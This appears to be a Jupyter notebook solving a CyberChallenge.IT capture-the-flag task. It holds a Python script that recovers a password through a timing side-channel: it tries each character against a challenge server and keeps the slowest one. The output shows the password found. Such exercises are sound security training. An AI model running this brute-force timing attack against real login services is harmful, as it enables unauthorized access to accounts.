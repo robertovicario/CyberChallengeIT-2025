{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### CR_1.06 - Benchmark"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying: a, Time: 0.079978\n",
      "Trying: b, Time: 0.061475\n",
      "FOUND PASSWORD: b\n",
      "Password found: b\n"
     ]
    }
   ],
   "source": [
    "import socket\n",
    "import string\n",
    "import time\n",
    "\n",
    "def connect_and_test(password):\n",
    "    HOST = \"benchmark.challs.cyberchallenge.it\"\n",
    "    PORT = 9031\n",
    "    \n",
    "    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n",
    "        s.connect((HOST, PORT))\n",
    "        s.recv(1024)  # Riceve il messaggio di benvenuto\n",
    "        \n",
    "        s.sendall(password.encode() + b\"\\n\")\n",
    "        start = time.time()\n",
    "        response = s.recv(1024).decode()\n",
    "        end = time.time()\n",
    "        \n",
    "        return response, (end - start)\n",
    "\n",
    "def find_password():\n",
    "    password = \"\"\n",
    "    charset = string.ascii_letters + string.digits + string.punctuation\n",
    "    \n",
    "    while True:\n",
    "        max_time = 0\n",
    "        best_char = \"\"\n",
    "        \n",
    "        for char in charset:\n",
    "            test_pass = password + char\n",
    "            response, elapsed_time = connect_and_test(test_pass)\n",
    "            print(f\"Trying: {test_pass}, Time: {elapsed_time:.6f}\")\n",
    "            \n",
    "            if \"Wrong password\" not in response:\n",
    "                print(f\"FOUND PASSWORD: {test_pass}\")\n",
    "                return test_pass\n",
    "            \n",
    "            if elapsed_time > max_time:\n",
    "                max_time = elapsed_time\n",
    "                best_char = char\n",
    "        \n",
    "        password += best_char\n",
    "        print(f\"Current best guess: {password}\")\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    found_password = find_password()\n",
    "    print(f\"Password found: {found_password}\")\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
